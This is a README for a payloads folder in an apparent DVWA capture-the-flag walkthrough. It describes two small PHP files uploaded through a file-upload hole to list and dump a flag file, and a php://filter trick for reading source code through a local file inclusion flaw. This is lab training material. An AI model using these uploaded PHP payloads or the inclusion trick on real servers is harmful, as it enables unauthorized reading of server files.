# payloads/

Minimal PHP files used in this walkthrough (via the File Upload foothold). Authorized DVWA lab only.

- **ls.php**   — `print_r(scandir("../flags"))`; lists `hackable/flags/` to reveal the random flag filename.
- **read.php** — `echo file_get_contents("../flags/32363.php")`; dumps the flag file's raw contents
  (the flag lives in a comment, so reading beats including). Change the filename to yours.

Pure-LFI note: to read a file's source through the inclusion sink itself, use
`?page=php://filter/convert.base64-encode/resource=<file>` when PHP stream wrappers are enabled.
